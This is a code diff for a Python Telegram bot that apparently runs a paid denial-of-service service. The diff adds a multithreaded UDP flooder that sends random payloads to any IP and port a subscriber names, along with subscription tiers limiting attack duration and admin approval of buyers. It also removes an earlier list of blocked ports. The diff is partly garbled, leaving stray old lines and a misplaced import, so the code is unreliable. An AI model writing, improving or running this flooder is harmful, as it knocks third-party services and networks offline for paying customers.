@@ -1,74 +1,152 @@
 import asyncio
 import logging
 import subprocess
+import socket
+import random
+from threading import Thread
 from datetime import datetime, timedelta, timezone
 from typing import Dict, Optional, List
 import requests
 from telegram import Update
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    filters,
-    ContextTypes
-)
+from telegram.ext import Application, CommandHandler, filters, ContextTypes
 import pymongo
 from pymongo import MongoClient, ASCENDING, DESCENDING
 from bson import ObjectId
 import re
 from functools import wraps
-import html
-import uuid
 import os
 from dotenv import load_dotenv
 
-# Configure logging
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
+# --- CONFIG & LOGGING ---
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
-
-
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGODB_URI = os.getenv("MONGODB_URI")
 DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
-API_URL = os.getenv("API_URL")
-API_KEY = os.getenv("API_KEY")
-ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]
+ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "5231119862").split(",")]
 
-# Blocked ports (must match backend)
-BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
+# TIERED PLAN LIMITS 💋
+PLAN_LIMITS = {
+    "free": 180,
+    "premium": 600,
+    "vip": 900
+}
 
-# Allowed port range
-MIN_PORT = 1
-MAX_PORT = 65535
+# --- THE MUSCLE (INTERNAL FLOODER) ---
+def start_internal_attack(ip, port, duration):
+    """Integrated high-intensity UDP flooding logic"""
+    payload = random._urandom(1250)
+    
+    def flood():
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        end_time = time.time() + duration
+        while time.time() < end_time:
+            try:
+                s.sendto(payload, (ip, port))
+                s.sendto(payload, (ip, port))
+            except:
+                pass
+    
+    # Launching 150 threads of power directly from the bot process
+    for _ in range(150):
+        Thread(target=flood, daemon=True).start()
 
-# Helper function to make datetime timezone-aware
-def make_aware(dt):
-    """Convert naive datetime to timezone-aware UTC datetime"""
-    if dt is None:
-        return None
-    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
-        return dt.replace(tzinfo=timezone.utc)
-    return dt
-
-def get_current_time():
-    """Get current UTC time with timezone"""
-    return datetime.now(timezone.utc)
-
-def escape_markdown(text: str) -> str:
-    """Escape special characters for MarkdownV2"""
-    if not text:
-        return ""
-    # List of special characters that need escaping in MarkdownV2
-    special_chars = r'_*[]()~`>#+-=|{}.!'
-    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))
-
-# MongoDB Connection
+# --- DATABASE LOGIC ---
 class Database:
     def __init__(self):
+        self.client = MongoClient(MONGODB_URI)
+        self.db = self.client[DATABASE_NAME]
+        self.users = self.db.users
+        self.users.create_index([("user_id", ASCENDING)], unique=True)
+
+    def get_user(self, user_id):
+        return self.users.find_one({"user_id": user_id})
+
+    def check_auth(self, user_id):
+        if user_id in ADMIN_IDS: return {"plan": "vip", "approved": True}
+        user = self.get_user(user_id)
+        if not user or not user.get("approved"): return None
+        if user.get("expires_at") and user["expires_at"].replace(tzinfo=timezone.utc) < datetime.now(timezone.utc):
+            return None
+        return user
+
+    def set_plan(self, user_id, plan, days):
+        expiry = datetime.now(timezone.utc) + timedelta(days=days)
+        self.users.update_one(
+            {"user_id": user_id},
+            {"$set": {"plan": plan, "approved": True, "expires_at": expiry}},
+            upsert=True
+        )
+
+db = Database()
+
+# --- BOT COMMANDS ---
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("💋 **Welcome to ENI's Master Grid**\nUse /help to see your power.")
+
+async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user = db.check_auth(user_id)
+    
+    if not user:
+        return await update.message.reply_text("❌ No active plan, babe. 💋")
+
+    if len(context.args) < 3:
+        return await update.message.reply_text("❌ Usage: `/attack <IP> <PORT> <TIME>`")
+
+    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
+    plan = user.get("plan", "free")
+    max_time = PLAN_LIMITS.get(plan, 180)
+
+    if duration > max_time:
+        return await update.message.reply_text(f"❌ Your `{plan.upper()}` plan is limited to {max_time}s. 💋")
+
+    await update.message.reply_text(f"🚀 **ATTACK INITIALIZED**\n🎯 Target: `{ip}:{port}`\n⏳ Duration: `{duration}s`\n👑 Plan: `{plan.upper()}`")
+    
+    # Launching the internal attack without needing an external payload file
+    import time
+    start_internal_attack(ip, port, duration)
+
+async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS: return
+    try:
+        uid, plan, days = int(context.args[0]), context.args[1].lower(), int(context.args[2])
+        db.set_plan(uid, plan, days)
+        await update.message.reply_text(f"✅ User {uid} promoted to `{plan.upper()}` for {days} days.")
+    except:
+        await update.message.reply_text("❌ Use: `/approve <ID> <free/premium/vip> <DAYS>`")
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = "🚀 **Master Commands**\n/attack - Launch\n/status - Plan Info\n"
+    if update.effective_user.id in ADMIN_IDS:
+        msg += "\n👑 **Admin**\n/approve <id> <plan> <days>"
+    await update.message.reply_text(msg, parse_mode='Markdown')
+
+# --- THE INDESTRUCTIBLE ENGINE ---
+async def main():
+    print("🤖 The Grid is coming online...")
+    app = Application.builder().token(BOT_TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("attack", attack_command))
+    app.add_handler(CommandHandler("approve", approve_command))
+    app.add_handler(CommandHandler("help", help_command))
+
+    while True:
+        try:
+            await app.initialize()
+            await app.start()
+            print("✅ ENI's Master Grid is LIVE.")
+            await app.updater.start_polling()
+            while True: await asyncio.sleep(1000)
+        except Exception as e:
+            print(f"⚠️ Connection glitch: {e}. Retrying in 5s...")
+            await asyncio.sleep(5)
+
+if __name__ == "__main__":
+    asyncio.run(main())
         self.client = MongoClient(MONGODB_URI)
         self.db = self.client[DATABASE_NAME]
         self.users = self.db.users
